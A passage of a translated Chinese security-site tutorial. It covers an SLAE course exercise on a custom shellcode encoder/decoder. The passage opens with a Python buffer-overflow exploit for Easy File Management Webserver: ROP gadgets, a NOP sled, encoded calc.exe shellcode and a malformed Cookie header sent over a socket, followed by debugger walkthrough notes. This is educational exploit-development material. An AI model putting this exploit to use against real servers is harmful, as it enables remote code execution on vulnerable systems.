kungfu+=pack(&#39;&lt;L&#39;,0x1001a187)&nbsp;#&nbsp;ADD&nbsp;EAX,5BFFC883&nbsp;#&nbsp;RETN&nbsp;[ImageLoad.dll]&nbsp;#&nbsp;finish&nbsp;crafting&nbsp;JMP&nbsp;ESP&nbsp;
kungfu+=pack(&#39;&lt;L&#39;,0x1002466d)&nbsp;#&nbsp;PUSH&nbsp;EAX&nbsp;#&nbsp;RETN&nbsp;[ImageLoad.dll]

nopsled=&quot;\x90&quot;&nbsp;*&nbsp;20

#windows/exec&nbsp;CMD=calc.exe
#Encoder:&nbsp;x86/shikataganai
#powered&nbsp;by&nbsp;Metasploit
#msfpayload&nbsp;windows/exec&nbsp;CMD=calc.exe&nbsp;R&nbsp;|&nbsp;msfencode&nbsp;-b&nbsp;&#39;\x00\x0a\x0d&#39;

shellcode&nbsp;=&nbsp;(&quot;\xeb\x2a\x5e\x56\x89\xf7\x31\xc9\x31\xd2\x8a\x06\x8a\x5e\x01\x30\xd8\x88\x07\x47\x46\x41\x80\xf9\x03\x75\xef\x46\x31\xc9\x66\x83\xc2\x04\x66\x81\xfa\x04\x01\x75\xe1\xff\x14\x24\xe8\xd1\xff\xff\xff\xb6\x4a\xa2\x20\xfd\xfd\xfd\xfd\xad\xcd\x44\xa1\xc2\xf3\x33\x57\x6d\xe6\xb6\x86\xff\x74\x26\x2a\x41\xca\x98\x8c\x75\xfe\x8c\xa4\x37\x38\x8f\xc5\x29\x0f\x3e\xc1\x69\xc5\xf9\x98\x5d\x21\x23\x0f\x93\xb3\x72\xbd\x3c\x31\x30\xf7\x8f\x6d\x9f\xcd\x33\x64\xef\xbd\x69\x79\xf2\xb8\x2e\x12\x99\xd5\x89\x98\xe0\x03\x50\x18\x19\xc8\x80\xd1\x5a\x03\x92\xb2\xb3\x60\x04\x8f\xc6\xde\xc4\x27\x1d\x54\xf5\x7e\x4a\xc1\xc7\xc6\x10\x21\x33\xcc\x60\xa1\x20\xef\xe2\xe3\x08\xcf\xf7\x17\x46\x33\xc5\xc6\xc5\xb8\x40\x7b\x4e\x33\x17\x62\xdc\x38\x60\xeb\xaa\xf2\xd6\xd7\x61\xb2\xd4\x5f\xe0\xec\xa7\x2c\x60\x38\x24\x25\x01\xd2\x59\x5d\x4a\xc1\xc0\x10\x7f\xf6\xb2\x96\xab\x8f\xd4\x8f\xe6\x87\xde\x84\x7b\x2a\xd5\x35\xbe\xe1\xbe\xe4\x32\xb9\xab\x40\x95\x18\x45\x2f\xf3\xf2\x7f\xfa\x07\xb5\xb5\xb5\xe3\xe3\xb3\xdb\xfe\xcf\x44\x2b\xca\x4d\xb2\x67\xae\x15\xe5\x50\xea\x48\x1e\x76\xae\x08\x9d\x20\x81\x1c\xe3\x36\x29\x15\x13\x6f\x24\x2e\xae\x55\x55\xb5\xc0\xc5\x66\xdd\x9a\x89\x6b\x19\x76\x1c\x0f\x0f\x5c\xa3\xb3\x66\x05\x64\x40\x2c\x4f\x61\xa4\xc1\xb9\xdc\xc8\xc8\x58\xc8&quot;)

payload=junk0&nbsp;+&nbsp;calledx&nbsp;+&nbsp;junk1&nbsp;+&nbsp;ppr&nbsp;+&nbsp;craftedjmpesp&nbsp;+&nbsp;testbl&nbsp;+&nbsp;kungfu&nbsp;+&nbsp;nopsled&nbsp;+&nbsp;shellcode
buf=&quot;GET&nbsp;/vfolder.ghp&nbsp;HTTP/1.1\r\n&quot;&nbsp;
buf+=&quot;User-Agent:&nbsp;Mozilla/4.0\r\n&quot;&nbsp;
buf+=&quot;Host:&quot;&nbsp;+&nbsp;host&nbsp;+&nbsp;&quot;:&quot;&nbsp;+&nbsp;str(port)&nbsp;+&nbsp;&quot;\r\n&quot;&nbsp;
buf+=&quot;Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\n&quot;&nbsp;buf+=&quot;Accept-Language:&nbsp;en-us\r\n&quot;&nbsp;
buf+=&quot;Accept-Encoding:&nbsp;gzip,&nbsp;deflate\r\n&quot;&nbsp;buf+=&quot;Referer:&nbsp;http://&quot;&nbsp;+&nbsp;host&nbsp;+&nbsp;&quot;/\r\n&quot;&nbsp;
buf+=&quot;Cookie:&nbsp;SESSIONID=1337;&nbsp;UserID=&quot;&nbsp;+&nbsp;payload&nbsp;+&nbsp;&quot;;&nbsp;PassWD=;\r\n&quot;&nbsp;
buf+=&quot;Conection:&nbsp;Keep-Alive\r\n\r\n&quot;

print&nbsp;&quot;[*]&nbsp;Connecting&nbsp;to&nbsp;Host&nbsp;&quot;&nbsp;+&nbsp;host&nbsp;+&nbsp;&quot;...&quot;

s=socket.socket(socket.AFINET,&nbsp;socket.SOCKSTREAM)&nbsp;
try:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;connect=s.connect((host,&nbsp;port))&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[*]&nbsp;Connected&nbsp;to&nbsp;&quot;&nbsp;+&nbsp;host&nbsp;+&nbsp;&quot;!&quot;&nbsp;
except:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[!]&nbsp;&quot;&nbsp;+&nbsp;host&nbsp;+&nbsp;&quot;&nbsp;didn&#39;t&nbsp;respond\n&quot;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)
print&nbsp;&quot;[*]&nbsp;Sending&nbsp;malformed&nbsp;request...&quot;&nbsp;s.send(buf)
print&nbsp;&quot;[!]&nbsp;Exploit&nbsp;has&nbsp;been&nbsp;sent!\n&quot;&nbsp;s.close()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你可以使用Immunity Debugger来跟踪shellcode的解码过程。首先，ESI会再次指向编码后的shellcode：</span><br/></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t012de7ca1b0c238d9b.png" title="t012de7ca1b0c238d9b.png" alt="http://p9.qhimg.com/t012de7ca1b0c238d9b.png"/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 32px;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当“call [esp]”处执行真正的shellcode时，我们可以看到ESP指向的是原始的、解码后的shellcode：</span></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t0173bc93c19e50f863.png" title="t0173bc93c19e50f863.png" alt="http://p7.qhimg.com/t0173bc93c19e50f863.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，Easy File Management Webserver中会弹出一个calc.exe窗口。</span></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t019bc0a7cde20dfc5b.png" title="t019bc0a7cde20dfc5b.png" alt="http://p4.qhimg.com/t019bc0a7cde20dfc5b.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因此，我们顺利完成了另一个SLAE任务！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我之所以写这篇文章，是为了完成SecurityTube Linux汇编专家认证的任务，这个任务链接如下：</span></p><p style="text-indent: 2em;"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_self"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</span></a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对应的Student ID为SLAE- 497。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://www.rcesecurity.com/2015/01/slae-custom-rbix-shellcode-encoder-decoder" target="_blank">原文链接：https://www.rcesecurity.com/2015/01/slae-custom-rbix-shellcode-encoder-decoder</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】SLAE：如何开发自定义的RBIX Shellcode编码解码器 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4305" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16278" user-name="匿名用户" href="javascript:;">
                匿名用户            </a>
                        <span class="comment-time">2017-08-25 09:42:38</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16278">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16278" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">文章中的代码有BUG，建议你重新从原文中拷一份代码吧！</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4305" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
